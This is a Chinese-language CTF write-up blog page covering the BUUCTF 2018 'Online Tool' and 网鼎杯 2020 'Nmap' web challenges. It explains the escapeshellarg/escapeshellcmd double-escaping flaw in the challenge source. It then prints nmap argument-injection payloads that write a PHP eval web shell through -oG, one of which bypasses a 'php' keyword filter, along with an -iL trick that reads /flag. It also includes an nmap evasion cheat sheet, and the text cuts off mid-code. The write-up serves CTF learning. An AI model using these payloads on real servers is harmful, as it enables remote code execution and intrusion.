@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="考点 绕过escapeshell 过滤关键字 php nmap写入文件储备知识12345678910111213141516171819202122232425262728nmap -v 127.0.0.1							给出了远程机器更详细的信息，显示冗余信息(扫描细节)nmap -iL nmaptest.txt 						运行带“iL” 选项的nmap命令来扫描文件中列出的所有IP地址nmap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell">
+<meta property="og:url" content="http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/index.html">
+<meta property="og:site_name" content="Imp1ture">
+<meta property="og:description" content="考点 绕过escapeshell 过滤关键字 php nmap写入文件储备知识12345678910111213141516171819202122232425262728nmap -v 127.0.0.1							给出了远程机器更详细的信息，显示冗余信息(扫描细节)nmap -iL nmaptest.txt 						运行带“iL” 选项的nmap命令来扫描文件中列出的所有IP地址nmap">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/2022-04-22-14-57-55.png">
+<meta property="article:published_time" content="2022-04-22T06:45:34.000Z">
+<meta property="article:modified_time" content="2022-04-22T06:58:21.087Z">
+<meta property="article:author" content="Imp1ture">
+<meta property="article:tag" content="WEB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/2022-04-22-14-57-55.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/04/22/BUUCTF-WEB-SWPU2019-Web1-%E6%97%A0%E5%88%97%E5%90%8Dsql%E6%B3%A8%E5%85%A5/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/04/21/Pwn-tips/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/&text=BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/&title=BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/&is_video=false&description=BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell&body=Check out this article: http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/&title=BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/&title=BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/&title=BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/&title=BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/&name=BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/&t=BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%82%A8%E5%A4%87%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">储备知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-number">3.</span> <span class="toc-text">[BUUCTF 2018]Online Tool</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.1.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.2.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell"><span class="toc-number">4.</span> <span class="toc-text">[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%951"><span class="toc-number">4.1.</span> <span class="toc-text">法1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%952"><span class="toc-number">4.2.</span> <span class="toc-text">法2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83-1"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell
+    </h1>
+
+
+
+	
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Imp1ture</span>
+      </span>
+	  <!--Leancloud 阅读量-->
+	  
+	<span id="/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/" class="leancloud-visitors" data-flag-title="BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell">
+		<em class="post-meta-item-text">阅读量</em>
+		<i class="leancloud-visitors-count">loading</i>
+	</span>
+
+
+
+	  
+	  <!--Leancloud 阅读量-->
+	  
+      
+    <div class="postdate">
+      
+        <time datetime="2022-04-22T06:45:34.000Z" itemprop="datePublished">2022-04-22</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/WEB/" rel="tag">WEB</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ol>
+<li>绕过escapeshell</li>
+<li>过滤关键字 php</li>
+<li>nmap写入文件<h2 id="储备知识"><a href="#储备知识" class="headerlink" title="储备知识"></a>储备知识</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">nmap -v <span class="number">127.0</span>.<span class="number">0.1</span>							给出了远程机器更详细的信息，显示冗余信息(扫描细节)</span><br><span class="line">nmap -iL nmaptest.txt 						运行带“iL” 选项的nmap命令来扫描文件中列出的所有IP地址</span><br><span class="line">nmap <span class="number">192.168</span>.<span class="number">0</span>.* --exclude <span class="number">192.168</span>.<span class="number">0.100</span>	使用“-exclude”选项来排除某些你不想要扫描的主机</span><br><span class="line">nmap -A <span class="number">192.168</span>.<span class="number">0.101</span>						启用操作系统和版本检测，脚本扫描和路由跟踪功能</span><br><span class="line">nmap -O <span class="number">127.0</span>.<span class="number">0.1</span>							使用选项“-O”和“-osscan-guess”也帮助探测操作系统信息</span><br><span class="line">nmap -sA <span class="number">192.168</span>.<span class="number">0.101</span>						扫描远程主机以探测该主机是否使用了包过滤器或防火墙</span><br><span class="line">nmap -PN <span class="number">192.168</span>.<span class="number">0.101</span>						扫描主机检测其是否受到数据包过滤软件或防火墙的保护</span><br><span class="line">nmap -sP <span class="number">192.168</span>.<span class="number">0</span>.*						找出网络中的在线主机</span><br><span class="line">nmap -F <span class="number">192.168</span>.<span class="number">0.101</span>						快速扫描，仅扫描nmap-services文件中的端口而避开所有其它的端口</span><br><span class="line">nmap -f <span class="number">192.168</span>.<span class="number">96.4</span>						使用小数据包发送，避免被识别出</span><br><span class="line">nmap -r <span class="number">192.168</span>.<span class="number">0.101</span>						不会随机的选择端口扫描</span><br><span class="line">nmap -p <span class="number">80</span>,<span class="number">443</span> <span class="number">192.168</span>.<span class="number">0.101</span>				使用“-P”选项指定你想要扫描的端口</span><br><span class="line">nmap -sV <span class="number">192.168</span>.<span class="number">0.101</span>						查找主机服务版本号</span><br><span class="line">nmap -PS <span class="number">192.168</span>.<span class="number">0.101</span>						使用TCP ACK和TCP Syn方法来扫描远程主机（防火墙会阻断标ICMP包）</span><br><span class="line">nmap -Pn <span class="number">192.168</span>.<span class="number">96.4</span>					  	目标机禁用ping，绕过ping扫描</span><br><span class="line">nmap -sn <span class="number">192.168</span>.<span class="number">96.4</span>						对目标进行ping检测，不进行端口扫描（发送四种报文确定目标是否存活）</span><br><span class="line">nmap -sS <span class="number">192.168</span>.<span class="number">0.101</span>						执行一次隐蔽的扫描，安全，快</span><br><span class="line">nmap -sT <span class="number">192.168</span>.<span class="number">0.101</span>						使用TCP Syn扫描最常用的端口，不安全，慢</span><br><span class="line">nmap -sN <span class="number">192.168</span>.<span class="number">0.101</span>						执行TCP空扫描以骗过防火墙</span><br><span class="line">nmap -sI 僵尸ip 目标ip						使用僵尸机对目标机发送数据包</span><br><span class="line">nmap <span class="number">192.168</span>.<span class="number">96.4</span> -oX myscan.xml			对扫描结果另存在myscan.xml</span><br><span class="line">nmap -T1~<span class="number">6</span> <span class="number">192.168</span>.<span class="number">96.4</span>						设置扫描速度，一般T4足够</span><br><span class="line">nmap –mtu &lt;size&gt; <span class="number">192.168</span>.<span class="number">96.4</span>				发送的包大小,最大传输单元必须是<span class="number">8</span>的整数</span><br><span class="line">nmap -D &lt;假ip&gt; <span class="number">192.168</span>.<span class="number">96.4</span>					发送参杂着假ip的数据包检测</span><br><span class="line">继续中断扫描：</span><br><span class="line">	nmap –oG <span class="number">1</span>.txt –v <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span>			-oG将扫描结果保存为TXT，Ctrl+C中断扫描</span><br><span class="line">	Nmap –resume <span class="number">1</span>.txt							作用：继续扫描</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>nmap保存文件参数</p>
+<p><img src="/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/2022-04-22-14-57-55.png"></p>
+<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>打开链接</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>阅读代码，攻击思路，绕过两个escape函数，然后用nmap写后门。均为知识盲区，下方链接可参考。<br>重点在于理解转码之后的字符串，写如文件正好可以被当作php代码执行。</p>
+<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</span><br><span class="line">功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，</span><br><span class="line">这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)</span><br></pre></td></tr></table></figure>
+<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">escapeshellcmd — shell 元字符转义</span><br><span class="line">功能：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 </span><br><span class="line">此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</span><br><span class="line">反斜线（\）会在以下字符之前插入：</span><br><span class="line">&amp;#;`|\?~&lt;&gt;^()[]&#123;&#125;$*, \x0A 和 \xFF*。 *’ 和 “ 仅在不配对儿的时候被转义。 </span><br><span class="line">在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">raw:&#x27; &lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php &#x27;</span><br><span class="line">escapeshellarg():</span><br><span class="line">\&#x27; &lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php \&#x27;         //转义单引号</span><br><span class="line">&#x27;\&#x27;&#x27; &lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php &#x27;\&#x27;&#x27;     //在刚转义的单引号前后加单引号进行连接</span><br><span class="line">&#x27;&#x27;\&#x27;&#x27; &lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php &#x27;\&#x27;&#x27;&#x27;   //首尾加单引号</span><br><span class="line"></span><br><span class="line">escapeshellcmd():</span><br><span class="line">&#x27;&#x27;\\&#x27;&#x27; \&lt;\?php eval\(\$_POST\[&quot;v&quot;\]\)\;\?\&gt; -oG shell.php &#x27;\\&#x27;&#x27;&#x27; //对所有特殊字符进行转义</span><br><span class="line">最后的输出，成对的单引号都会被当作链接，特殊字符被转移，即为 \ &lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php \\</span><br></pre></td></tr></table></figure>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44348894/article/details/105520481?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.opensearchhbase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.opensearchhbase">[BUUCTF 2018]Online Tool（超详细解析payload）</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11532530.html">刷题记录：[BUUCTF 2018]Online Tool</a><br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html">谈escapeshellarg绕过与参数注入漏洞</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/116902085">利用&#x2F;绕过escapeshellarg&#x2F;escapeshellcmd函数</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/cunjiu9486/article/details/109075403">nmap输出格式_Nmap输出</a></p>
+<h2 id="网鼎杯-2020-朱雀组-Nmap-绕过escapeshell"><a href="#网鼎杯-2020-朱雀组-Nmap-绕过escapeshell" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell"></a>[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell</h2><p>同理，只不过是过滤了关键字 php</p>
+<h3 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h3><p>同上题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; &lt;?= eval($_POST[&#x27;</span>pwd<span class="string">&#x27;]);?&gt; -oG shell.php &#x27;</span></span><br></pre></td></tr></table></figure>
+<h3 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1<span class="string">&#x27; -iL /flag -oN vege.txt &#x27;</span></span><br><span class="line">最后执行是</span><br><span class="line">nmap 127.0.0.1<span class="string">&#x27; -iL /flag -oN gugu.txt &#x27;</span></span><br><span class="line">-iL是扫描对应文本里的ip，这里读取flag读取失败，将结果输出到gugu.txt</span><br></pre></td></tr></table></figure>
+<p>最后<br>贴一下蚁剑连接之后拿到的源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;settings.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;host&#x27;</span>])):</span><br><span class="line">	<span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WEB_SCANS&#x27;</span>)) &#123;</span><br><span class="line">        	<span class="keyword">die</span>(<span class="string">&#x27;Web scans disabled&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$host</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$host</span>,<span class="string">&#x27;php&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">	<span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$filename</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>() . <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10</span>)), <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line">	<span class="variable">$command</span> = <span class="string">&quot;nmap &quot;</span>. NMAP_ARGS . <span class="string">&quot; -oX &quot;</span> . RESULTS_PATH . <span class="variable">$filename</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$host</span>;</span><br><span class="line">	<span class="variable">$result_scan</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$command</span>);</span><br><span class="line">	<span 